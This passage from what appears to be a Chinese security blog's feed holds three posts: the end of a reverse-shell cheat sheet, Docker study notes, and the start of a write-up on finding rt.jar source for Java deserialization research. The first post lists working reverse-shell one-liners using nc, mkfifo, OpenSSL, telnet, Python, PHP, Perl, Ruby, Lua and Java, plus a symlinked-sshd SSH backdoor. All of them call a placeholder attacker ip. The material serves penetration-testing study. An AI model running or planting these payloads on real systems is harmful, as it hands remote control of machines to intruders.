shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh ip 4000</span><br></pre></td></tr></table></figure><p>如果-e 参数用不了怎么办？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 4000 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>mkfifo首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。</p><p>还可以：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc ip 4000 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure><h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><h3 id="利用OpenSSL"><a href="#利用OpenSSL" class="headerlink" title="利用OpenSSL"></a>利用OpenSSL</h3><p>先生成自签名证书，一路回车：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><p>首先在攻击机上开放4000端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4000</span><br></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的4000端口上启动了一个 SSL/TLS server。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ip:port &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><h3 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h3><p>方法1：单端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">mknod a p; telnet attacker_ip 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure><p>方法2：双端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4000</span><br><span class="line">nc -lvvp 5000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4000 输入 5000输出</span></span><br><span class="line">telnet ip 4000 | /bin/bash | telnet ip 5000</span><br></pre></td></tr></table></figure><h3 id="利用SSH"><a href="#利用SSH" class="headerlink" title="利用SSH"></a>利用SSH</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">受害主机执行:</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=5000;   </span><br><span class="line"></span><br><span class="line">攻击机器:</span><br><span class="line">ssh root@victim_ip -p 5000 [用户名root,密码随意]</span><br></pre></td></tr></table></figure><h2 id="利用各种语言脚本"><a href="#利用各种语言脚本" class="headerlink" title="利用各种语言脚本"></a>利用各种语言脚本</h2><p>攻击机ip，监听port</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e 'c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">1</a></p><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">2</a></p><p><a href="https://xz.aliyun.com/t/9488#toc-9" target="_blank" rel="noopener">3</a></p><p><a href="https://jkme.github.io/pages/reverse-shell.html" target="_blank" rel="noopener">4</a></p><p><a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener">netcat用法</a></p><p><a href="https://huangwang.github.io/2019/09/22/netcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/" target="_blank" rel="noopener">netcat使用方法</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;曲径通幽处，禅房花木深。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 抽空总结一下nc经典用法以及反弹shell的多种姿势。   &lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="shell" scheme="https://0range228.github.io/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://0range228.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://0range228.github.io/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-19T03:17:25.000Z</published>
    <updated>2021-10-03T01:56:27.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>欲穷千里目，更上一层楼。</p></blockquote><p>在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。</p><a id="more"></a><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>Docker包括三个基本概念：</p><ul><li>镜像<code>Image</code></li><li>容器<code>Container</code></li><li>仓库<code>Repository</code></li></ul><p>镜像就像类，容器就像实例。  </p><p>容器的实质是进程，容器进程属于自己独立的命名空间，也就是进程隔离</p><p>仓库是镜像的存储分发，默认仓库内的镜像是<code>&lt;仓库名&gt;:&lt;Tag&gt;</code>，默认tag是latest</p><p>对于一个<a href="https://hub.docker.com/_/ubuntu" target="_blank" rel="noopener">ubuntu</a>仓库来说：     </p><p>ubuntu是仓库的名字，<code>ubuntu：16.04</code>和<code>ubuntu:18.04</code>则是两个不同标签代表不同版本。</p><p>仓库通常是<strong>两段式命名</strong>，例如<code>ownername/nginx</code></p><p>前者是用户名，后者是镜像。</p><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="获取镜像"><a href="#获取镜像" class="headerlink" title="获取镜像"></a>获取镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [args] [域名[：端口号] /] 仓库名[:标签]</span><br></pre></td></tr></table></figure><p><code>docker pull --help</code>看细节</p><ul><li>docker仓库地址：<code>&lt;域名/IP&gt;[:端口号]</code> 默认地址是docker.io</li><li>仓库名：<code>&lt;仓库名/软件名&gt;</code> 仓库名不写，默认是library，也就是官方镜像</li></ul><p>比如：<code>docker pull ubuntu:18.04</code></p><p>完整仓库名就是：<code>docker.io/library/ubuntu:18.04</code></p><h2 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -i -t --rm ubuntu:18.04 /bin/bash</span></span><br></pre></td></tr></table></figure><p>解读：</p><ul><li><code>-i</code>参数是启动容器内交互式操作模式</li><li><code>-t</code>参数是在容器内开启一个终端</li><li><code>--rm</code>代表容器退出后随之将该容器删除，不必再手动rm</li><li><code>bash</code>就是给容器的命令，这里我们希望得到交互式shell，所以打开bash</li></ul><p>其他参数：</p><ul><li><code>-d</code>可以让容器在后台运行</li><li><code>-p</code></li><li><code>exit</code>退出容器</li></ul><h2 id="列出镜像"><a href="#列出镜像" class="headerlink" title="列出镜像"></a>列出镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br><span class="line">docker images -a</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519121316891.png" alt="image-20210519121316891"></p><p>参数：</p><ul><li><code>docker image ls -q</code>只显示image的id</li><li><code>docker image ls ubuntu</code>只显示仓库名是ubuntu的image</li></ul><h2 id="删除本地镜像"><a href="#删除本地镜像" class="headerlink" title="删除本地镜像"></a>删除本地镜像</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image rm [args] &lt;image<span class="string">'s id/reponame/&gt;</span></span><br><span class="line"><span class="string">docker rmi -f 镜像id</span></span><br><span class="line"><span class="string">docker rmi -f $(docker images -aq) #删除全部镜像</span></span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>这里面的<code>image&#39;s id</code>通常可以是长ID12位，也可以仅仅是前3位短id</li></ul><p>配合docker image ls</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm $(docker image ls -q redis) <span class="comment">#删除所有仓库名为 redis 的镜像</span></span><br></pre></td></tr></table></figure><h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><h2 id="提交镜像"><a href="#提交镜像" class="headerlink" title="提交镜像"></a>提交镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m "xxx" -a="author" 镜像id 目标镜像名：TAG</span><br></pre></td></tr></table></figure><p>保存在本地</p><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><h2 id="新建-amp-启动"><a href="#新建-amp-启动" class="headerlink" title="新建&amp;启动"></a>新建&amp;启动</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu:18.04 /bin/<span class="built_in">echo</span> <span class="string">"helloworld"</span></span></span><br></pre></td></tr></table></figure><p>没有的镜像，会自动pull </p><h2 id="守护态运行"><a href="#守护态运行" class="headerlink" title="守护态运行"></a>守护态运行</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122754667.png" alt="image-20210519122754667"></p><p>会将结果打印在本地终端，这里需要启动<code>-d</code>参数，来让容器在后台运行：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d ubuntu /bin/sh -c <span class="string">"while true; do echo hello world; sleep 1; done"</span></span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519122959476.png" alt="image-20210519122959476"></p><p>就不再会打印到本地终端。</p><p>使用<code>docker logs 86d4eab113a908ce2ee49fa46145623d62a290a76ab3807429588f7c2868bd6</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519123132506.png" alt="image-20210519123132506"></p><p>输出内容会在日子里体现出来，</p><h2 id="查看运行中的容器"><a href="#查看运行中的容器" class="headerlink" title="查看运行中的容器"></a>查看运行中的容器</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps -a <span class="comment"># 查看历史运行过的容器</span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519130640053.png" alt="image-20210519130640053"></p><p>对比可以发现，刚才那一长串才是完整ID</p><p>查看自动容器的日志：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container logs [id or name]</span><br></pre></td></tr></table></figure><h2 id="终止-amp-重启容器"><a href="#终止-amp-重启容器" class="headerlink" title="终止&amp;重启容器"></a>终止&amp;重启容器</h2><p>首先，当容器内的程序结束时，容器也将自动终止。</p><p>对于一般情况，可以使用<code>docker container stop [id or name]</code>来终止</p><p>终止状态的docker信息可以<code>docker container ls -a</code>来查看</p><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519131228416.png" alt="image-20210519131228416"></p><p>在容器内部</p><p><code>exit</code>退出并终止容器</p><p><code>ctrl+p+q</code> 退出但不终止容器</p><p>对于已经停掉的容器，重新启动可以<code>docker container start [id or name]</code></p><p>对于正在运行的容器，强制重新启动可以<code>docker container restart [id or name]</code></p><p>删除全部容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f $(docker ps -aq)</span><br><span class="line">docker ps -aq | xargs docker rm</span><br></pre></td></tr></table></figure><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><p>attach和exec都可以，更推荐exec</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line"></span><br><span class="line">docker exec -it [shortid] /bin/bash <span class="comment"># 进入容器后开启新的终端</span></span><br><span class="line">docker attach [shortid] <span class="comment"># 进入容器当前正在执行的终端</span></span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132015322.png" alt="image-20210519132015322"></p><p>原因：</p><ul><li><code>-it</code>一起使用时，可以进入交互模式，并且可以看到熟悉的<code>linux</code>命令提示符</li></ul><h2 id="容器的导出-amp-导入"><a href="#容器的导出-amp-导入" class="headerlink" title="容器的导出&amp;导入"></a>容器的导出&amp;导入</h2><p><strong>导出</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export id &gt; ubuntu.tar</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210519132819881.png" alt="image-20210519132819881"></p><p><strong>导入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ubuntu.tar | docker import - <span class="built_in">test</span>/ubuntu:v1.0</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE</span><br><span class="line">test/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB</span><br></pre></td></tr></table></figure><p>也可以通过网址来import：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="keyword">import</span> http:<span class="comment">//example.com/exampleimage.tgz example/imagerepo</span></span><br></pre></td></tr></table></figure><h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><p><strong>删除正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container rm -f [id or name]</span><br></pre></td></tr></table></figure><p><strong>删除所有容器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker container prune</span><br></pre></td></tr></table></figure><h2 id="外部网络访问容器"><a href="#外部网络访问容器" class="headerlink" title="外部网络访问容器"></a>外部网络访问容器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P nginx</span><br></pre></td></tr></table></figure><p><code>-P</code>参数的意思就是随机打开一个本地端口</p><p>查看访问日志；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs id</span><br></pre></td></tr></table></figure><p><code>-p</code> 则可以指定要映射的端口，并且，在一个指定端口上只可以绑定一个容器。支持的格式有 <code>ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 55500:80</span><br></pre></td></tr></table></figure><p>意思就是本机的55500端口映射给80端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80</span><br></pre></td></tr></table></figure><p>的意思就是<strong>映射全部端口</strong>。</p><p>比较：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p 80:80 绑定对应所有端口</span><br><span class="line">-p 127.0.0.1:80:80 指定映射使用一个特定地址</span><br><span class="line">-p 127.0.0.1::80 绑定本地的任意端口给容器的80端口</span><br></pre></td></tr></table></figure><p><strong>查看端口映射的配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port id 80</span><br></pre></td></tr></table></figure><p>查看当前所有的网络配置</p><p>·</p><h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器id</span><br></pre></td></tr></table></figure><h1 id="额外的备忘命令"><a href="#额外的备忘命令" class="headerlink" title="额外的备忘命令"></a>额外的备忘命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看当前运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有容器，包括停止的</span></span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看最新创建的容器，只列出最后创建的</span></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看网络端口</span></span><br><span class="line">docker port [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部的标准输出</span></span><br><span class="line">docker logs [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器内部运行的进程</span></span><br><span class="line">docker top [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息</span></span><br><span class="line">docker inspect [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除指定镜像</span></span><br><span class="line">docker rmi image_id</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器，删除容器时，容器必须是停止状态</span></span><br><span class="line">docker rm [容器ID|容器名]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除所有的容器</span></span><br><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p><img src="../images/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210930213709652.png" alt="image-20210930213709652"></p><h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><p>   容器之间数据共享的技术，将容器内部的目录，挂载到宿主机上</p><h2 id="命令挂载"><a href="#命令挂载" class="headerlink" title="命令挂载"></a>命令挂载</h2><p><code>-v 主机目录:容器目录</code></p><p>数据映射</p><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>docker的构建文件，本质为命令脚本</p><p>镜像多层，命令多行</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f Dockerfile -t 镜像名:版本 .</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>CMD</strong>  docker run 会执行 </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"ls"</span>,<span class="string">"-a"</span>]</span></span><br><span class="line">&amp;&amp; 拼接</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://yeasy.gitbook.io/docker_practice/" target="_blank" rel="noopener">Docker-入门到实战</a></p><p><a href="https://segmentfault.com/a/1190000017151019" target="_blank" rel="noopener">MacOS Docker安装和使用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;欲穷千里目，更上一层楼。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在调试漏洞的过程中会密切地和Docker打交道，总结一下Docker的操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具" scheme="https://0range228.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Docker" scheme="https://0range228.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>记一次对线rt.jar</title>
    <link href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/"/>
    <id>https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/</id>
    <published>2021-05-13T06:39:35.000Z</published>
    <updated>2021-05-25T13:20:52.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>独立三边静，轻生一剑知。</p></blockquote><p>记录一次对线rt.jar的经历。</p><a id="more"></a><h1 id="过程全记录"><a href="#过程全记录" class="headerlink" title="过程全记录"></a>过程全记录</h1><p>前一阵在复习CC链的时候，想着从PoC来逆向分析ysoserial师傅们的挖掘思路。</p><p>LazyMap函数的get函数很有挖掘潜力，所以我需要找哪些类调用了get方法。</p><p>已知答案是AnnotationInvocationHandler的invoke函数调用了get函数，可以执行下去。</p><p>现在我想用IDEA搜索一下，但是无奈没有找到。 </p><p>发现这个类属于sun.reflect.annotation包，位于rt.jar中，主动去搜索这个类你是可以看到的。</p><p><strong>IDEA可以反编译出来rt.jar的源码，但是不会帮你进去搜索代码细节，因为它没有源码</strong></p><p>直接去翻$JAVA_HOME，src.zip里面是jdk源码，但是并没有sun包。。</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513153049164.png" alt="image-20210513153049164"></p><p>搜索资料，我发现sun是oracle选择闭源的几个包之一。</p><p>Oracle选择性闭源？无奈又好笑，这能忍？</p><p>如何拿到rt.jar的源码，火速学习了一波。</p><p>所以我想着先去搞到openJDK7的源码。</p><p>搜了一波，发现<a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a>可以搞到源码，网速感人，要有耐心。。。</p><p>以我自己的7u21为例子：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150521166.png" alt="image-20210513150521166"></p><p>点击jdk7u-jdk，进去之后点击browse可以看内容</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150614447.png" alt="image-20210513150614447"></p><p>也可以不废话，直接点击zip下载</p><p>然后就拿到了一个zip解压：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150829266.png" alt="image-20210513150829266"></p><p>然后依次进入src-share-classes，看到了sun：</p><p><img 